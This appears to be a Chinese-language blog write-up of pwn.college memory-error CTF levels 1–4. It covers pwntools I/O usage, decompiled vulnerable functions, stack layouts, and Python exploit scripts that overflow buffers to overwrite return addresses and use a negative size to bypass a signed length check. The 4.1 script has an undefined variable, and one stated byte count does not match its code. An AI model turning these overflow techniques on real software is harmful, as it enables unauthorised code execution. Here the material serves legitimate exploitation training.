---
title: PWN-College-Shellcode-Injection-Writeup
date: 2024-07-30 11:02:00
author: 美食家李老叭
img: https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20240709193107.png
top: false
hide: false
cover: false
coverImg: 
password: 
toc: true
mathjax: false
summary: CTF 
categories: CTF
tags:
    - 逆向
---
# pwn.college Memory


https://pwn.college/program-security/memory-errors/

## 值得记录的问题

### python 中 pwn库 的使用

```python
output = p.recv()
output = p.recvuntil(b'Send')
output = p.recvall() # 只有这种方式会导致程序退出
output = p.recvline()

print(output)
if p.poll() is not None:  # 如果进程已经结束，poll() 将返回退出状态码
    print("Process has ended.")
else:
    print("Process is still running.")
exit()
```

在 pwntools 中，如果你调用 `p.recvall()`，它会尝试接收目标进程的所有输出数据，直到进程结束或达到指定的超时时间。然而，`p.recvall()` 并不会自动接收到之前已经产生但没有显式接收的输出数据。 p.recvall() 只会接收从调用时起存在的输出数据。

**理解数据接收**
在交互式程序中，如果你在前半部分没有调用 `p.recvline()`、`p.recv()` 等接收函数，且程序有输出数据，那么这些输出数据会被缓存在内部的接收缓冲区中。调用 `p.recvall()` 后，它会读取缓冲区中的所有数据，直到进程终止或达到超时。
因此，如果你在交互式过程中错过了某些输出数据（例如没有调用接收函数），调用 `p.recvall() `时仍然会接收这些数据（因为它们仍在缓冲区中），但是如果某些输出数据被丢弃或错过了（例如由于缓冲区溢出或其他原因），则无法恢复。

示例
```python
from pwn import *
p = process('/challenge/interact_program')

# 交互的前半部分，可能发送了一些输入但没有接收输出
p.sendline(b'first command')
# 假设程序输出了一些内容但没有调用 `p.recvline()` 进行接收

# 交互的后半部分，调用 `p.recvall()`
output = p.recvall(timeout=1).decode('utf-8')
print(output)
```

在上述示例中，如果在发送 `first command` 后，程序产生了一些输出而没有显式调用 `p.recvline()` 等函数接收，这些输出数据会在 `p.recvall() `调用时被接收，因为它们仍在缓冲区中。输出缓冲区：如果程序输出大量数据且未及时接收，可能会导致缓冲区溢出，丢失数据。交互性：在交互式程序中，确保在合适的时机接收和处理输出，以避免错过关键信息。总的来说，`p.recvall()`可以接收到调用前程序产生的所有未被处理的输出数据，但它只会接收从调用时刻起存在的所有数据。对于交互式程序，确保在每次交互后适当地接收输出数据是重要的，以免错过程序产生的重要输出。

#### 处理交互式程序的输出

**如果程序是交互式的，并且需要多次输入，那么在每次输入后立即调用 p.recvall() 或类似的阻塞方法（如 p.recvuntil()、p.recv() 等）可能会导致脚本卡住，因为这些方法通常会等待直到有数据可读或者达到超时时间。如果程序没有立即输出数据，脚本会一直等待。**

在处理需要多次输入的交互式程序时，通常使用如下几种方法：

1. 使用 p.recvline() 或 p.recvuntil()
这些方法可以接收一行数据或者直到特定的标志出现时停止。这对于读取预期的输出提示符或者阶段性信息非常有用。
```python
from pwn import *
p = process('/challenge/interact_program')
# 发送第一次输入
p.sendline(b'first command')
# 接收并处理第一次输出，假设我们知道它会输出一行结束
output = p.recvline()
print(output.decode())

# 发送第二次输入
p.sendline(b'second command')
# 接收并处理第二次输出，直到出现特定的提示符
output = p.recvuntil(b'expected prompt')
print(output.decode())
```
2. 设置超时
设置接收方法的超时时间，以避免程序长时间等待。这对处理未知长度的输出特别有用。
```python
from pwn import *
p = process('/challenge/interact_program')
# 发送第一次输入
p.sendline(b'first command')
# 尝试接收输出，设定超时
try:
    output = p.recv(timeout=2)
    print(output.decode())
except EOFError:
    print("No more data, process may have ended.")
# s发送第二次输入
p.sendline(b'second command')
# 接收并处理第二次输出
try:
    output = p.recv(timeout=2)
    print(output.decode())
except EOFError:
    print("No more data, process may have ended.")
```

3. 分步处理和条件判断
根据程序的交互过程，分步处理输入输出。对于每一步，判断是否有足够的输出数据来决定下一步操作。

```python
from pwn import *
p = process('/challenge/interact_program')

# 发送第一次输入
p.sendline(b'first command')
# 尝试接收部分输出
try:
    output = p.recv(timeout=2)
    print(output.decode())
except EOFError:
    print("Process terminated unexpectedly.")

# 如果程序预期有多次输入输出循环，可以继续相同的模式处理
p.sendline(b'second command')
try:
    output = p.recv(timeout=2)
    print(output.decode())
except EOFError:
    print("Process terminated unexpectedly.")
```
4. 非阻塞模式
如果需要非阻塞地处理，可以使用 p.poll() 方法来检查进程状态，或者使用线程来处理 I/O。
```python
from pwn import *
p = process('/challenge/interact_program', stdout=PIPE, stderr=PIPE)
# 发送第一次输入
p.sendline(b'first command')
# 非阻塞地检查是否有输出
while True:
    if p.poll() is not None:
        break
    output = p.stdout.read()
    if output:
        print(output.decode())
```
总结
在处理交互式程序时，需要谨慎处理输入输出的时机和顺序。确保程序的每一步输出都能被正确读取，并且在预期没有输出时避免阻塞。这可以通过合适的接收方法（如 recvline()、recvuntil()）、超时机制、非阻塞 I/O 或者分步处理的方式来实现。







###

### 

## level 1

第一关是个栈溢出的问题，理清楚栈结构就行。

```c
__int64 challenge()
{
  int *v0; // rax
  char *v1; // rax
  size_t nbytes; // [rsp+28h] [rbp-48h] BYREF
  void *buf; // [rsp+30h] [rbp-40h]
  _DWORD *v5; // [rsp+38h] [rbp-38h]
  __int64 v6[3]; // [rsp+40h] [rbp-30h] BYREF
  __int64 v7[3]; // [rsp+58h] [rbp-18h] BYREF

  v7[2] = __readfsqword(0x28u);
  memset(v6, 0, sizeof(v6));
  v7[0] = 0LL;
  buf = v6;
  v5 = (_DWORD *)v7 + 1;
  nbytes = 0LL;
  printf("Payload size: ");
  __isoc99_scanf("%lu", &nbytes);
  printf("Send your payload (up to %lu bytes)!\n", nbytes);
  if ( (int)read(0, buf, nbytes) < 0 )
  {
    v0 = __errno_location();
    v1 = strerror(*v0);
    printf("ERROR: Failed to read input -- %s!\n", v1);
    exit(1);
  }
  if ( *v5 )
    win();
  puts("Goodbye!");
  return 0LL;
}
```

栈结构，不知道为什么反汇编出来的`v5`是`v5= (_DWORD*)v7 + 1`。按照汇编语言来看的话`lea     rax, [rbp+var_30] \ add     rax, 1Ch \ mov     [rbp+var_38], rax`,应该是指向`0x1005C`大小为8个字节的数据。不知道为什么ida反编译的结果会跟v7联系起来。

```text
rsp\rbp --> 0x10000
        --> 0x10008
        --> 0x10010
        --> 0x10018  
        --> 0x10020
        --> 0x10028 
        --> 0x10030
        --> 0x10038 v5
        --> 0x10040 v6[0]  <-----buf
        --> 0x10048 v6[1]
        --> 0x10050 v6[2]
        --> 0x10058 v7[0]
                        0x1005C  <-----v5
        --> 0x10060 v7[1]
        --> 0x10068 v7[2]
rbp ------- 0x10070  old rbp
```

对应的结果跟上述描述一致，当输入超过28个字节的时候，可以显示flag。当输入等于28个字节的时候，不能显示flag。

```bash

hacker@memory-errors~level1-1:~/memory/level1$ ./babymem_level1.1
###
### Welcome to ./babymem_level1.1!
###

Payload size: 111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
Send your payload (up to 18446744073709551615 bytes)!
ERROR: Failed to read input -- Bad address!
hacker@memory-errors~level1-1:~/memory/level1$ ./babymem_level1.1
###
### Welcome to ./babymem_level1.1!
###

Payload size: 28
Send your payload (up to 28 bytes)!
11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
Goodbye!

hacker@memory-errors~level1-1:~/memory/level1$ ./babymem_level1.1
###
### Welcome to ./babymem_level1.1!
###

Payload size: 29
Send your payload (up to 29 bytes)!
11111111111111111111111111111111111111111111111111111111111111111111111111111111
You win! Here is your flag:

  ERROR: Failed to open the flag -- Permission denied!
  Your effective user id is not 0!
  You must directly run the suid binary in order to have the correct permissions!
Goodbye!
```

## level 2

跟第一关的区别是，要把溢出的位置设置成某个十六进制数字`0x122925f0`。 关于变量反汇编又反汇编成`v5 = (_DWORD *)v7 + 1;`这样了，搜了一下，`_DWORD`是32位的，这样的话就对了，刚刚好是

```asm
.text:0000000000001E81 48 8D 45 E0                   lea     rax, [rbp+var_20] <----这里刚刚好是v6的地址
.text:0000000000001E85 48 83 C0 14                   add     rax, 14h          <----加20刚刚好是（int_32*）v7+1
.text:0000000000001E89 48 89 45 D8                   mov     [rbp+var_28], rax
```

```text
rsp\rbp --> 0x10000
        --> 0x10008
        --> 0x10010
        --> 0x10018  
        --> 0x10020
        --> 0x10028 
        --> 0x10030
        --> 0x10038 v5
        --> 0x10040 v6[0]  <-----buf
        --> 0x10048 v6[1]
        --> 0x10050 v7[0]
        --> 0x10058 v7[1]
       ..............
rbp ------- 0x10060  old rbp
```

```c
__int64 challenge()
{
  int *v0; // rax
  char *v1; // rax
  size_t nbytes; // [rsp+28h] [rbp-38h] BYREF
  void *buf; // [rsp+30h] [rbp-30h]
  _DWORD *v5; // [rsp+38h] [rbp-28h]
  __int64 v6[2]; // [rsp+40h] [rbp-20h] BYREF
  __int64 v7[2]; // [rsp+50h] [rbp-10h] BYREF

  v7[1] = __readfsqword(0x28u);
  v6[0] = 0LL;
  v6[1] = 0LL;
  v7[0] = 0LL;
  buf = v6;
  v5 = (_DWORD *)v7 + 1;
  nbytes = 0LL;
  printf("Payload size: ");
  __isoc99_scanf("%lu", &nbytes);
  printf("Send your payload (up to %lu bytes)!\n", nbytes);
  if ( (int)read(0, buf, nbytes) < 0 )
  {
    v0 = __errno_location();
    v1 = strerror(*v0);
    printf("ERROR: Failed to read input -- %s!\n", v1);
    exit(1);
  }
  if ( *v5 == 0x773E1A11 )
    win();
  puts("Goodbye!");
  return 0LL;
}
```

## level 3

### 3.0

这一关是要将返回地址覆盖为win，3.0的程序是自带回显的。解释的已经很清楚了。

使用`objdump -t babymem_level3.0` 查询之后，win函数的地址是`0x0000000000401b15`

```asm
###
### Welcome to ./babymem_level3.0!
###

The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffc285f1e50 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc285f1e58 (rsp+0x0008) | f8 2f 5f 28 fc 7f 00 00 | 0x00007ffc285f2ff8 |
| 0x00007ffc285f1e60 (rsp+0x0010) | e8 2f 5f 28 fc 7f 00 00 | 0x00007ffc285f2fe8 |
| 0x00007ffc285f1e68 (rsp+0x0018) | a0 c6 58 b0 01 00 00 00 | 0x00000001b058c6a0 |
| 0x00007ffc285f1e70 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc285f1e78 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc285f1e80 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc285f1e88 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc285f1e90 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc285f1e98 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc285f1ea0 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc285f1ea8 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc285f1eb0 (rsp+0x0060) | d0 11 40 00 00 00 00 00 | 0x00000000004011d0 |
| 0x00007ffc285f1eb8 (rsp+0x0068) | 80 1e 5f 28 fc 7f 00 00 | 0x00007ffc285f1e80 |
| 0x00007ffc285f1ec0 (rsp+0x0070) | f0 2e 5f 28 fc 7f 00 00 | 0x00007ffc285f2ef0 |
| 0x00007ffc285f1ec8 (rsp+0x0078) | 41 22 40 00 00 00 00 00 | 0x0000000000402241 |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffc285f1e50, and our base pointer points to 0x7ffc285f1ec0.
This means that we have (decimal) 16 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 128 bytes.
The input buffer begins at 0x7ffc285f1e80, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 46 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is no "win" variable.
You will need to force the program to execute the win() function
by directly overflowing into the stored return address back to main,
which is stored at 0x7ffc285f1ec8, 72 bytes after the start of your input buffer.
That means that you will need to input at least 80 bytes (46 to fill the buffer,
26 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).

We have disabled the following standard memory corruption mitigations for this challenge:
- the canary is disabled, otherwise you would corrupt it before
overwriting the return address, and the program would abort.
- the binary is *not* position independent. This means that it will be
located at the same spot every time it is run, which means that by
analyzing the binary (using objdump or reading this output), you can
know the exact value that you need to overwrite the return address with.

```

### 3.1 

3.1 这关没有回显。
反汇编之后，发现我们需要覆盖0x60（覆盖距离rbp的数据区域） + 8 个字节的数据（覆盖rbp数据），然后才是ret返回地址。 也就是一共112个字节的数据。

```python
binary_data = b'\x61'* 0x68 + b'\x82\x14\x40\x00\x00\x00\x00\x00'
```




## level 4

### 4.0 

相比之前的关卡，这一关在输入payloadsize之后，会增加一个校验。如果这个输入大于63字节的话，就会终止。是以有符号整数形式加载的。
```c
  if ( SLODWORD(nbytes[0]) > 63 )
  {
    puts("Provided size is too large!");
    exit(1);
  }
```

但是在后续read函数读取的时候，`v9 = read(0, buf, LODWORD(nbytes[0]));`是以无符号整数的形式，调用的。所以我们可以传递一个负数，这样的话，就可以绕过检测。

```python
#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'

p = process('/challenge/babymem_level4.0')

# 准备有效载荷
buffer_size = 88
win_func_address = p64(0x4022cb)  # 替换为实际地址

# 发送整数下溢值绕过大小检查
# p.sendlineafter("Payload size: ", "-1")
p.sendline("-1")

# 构造溢出并覆盖返回地址的有效载荷
payload = b'A' * buffer_size
payload += win_func_address
 
p.sendline(payload)
p.interactive()

```
### 4.1

以后要多用pwn编程，这样很快，不然后面的效率提不上来。

```python
from pwn import *

elf = ELF("/challenge/babymem_level4.1")
context.arch = 'amd64'
p = process("/challenge/babymem_level4.1")

p.sendline("-2")

buffer_size = 0x70
padding_rbp_size = 8  # rbp
win_func_address = p64(0x401fd2)
payload = b'A'*buffer_size + b'B'* padding_size + win_func_address
p.sendline(payload)

p.interactive()
```

## level 5


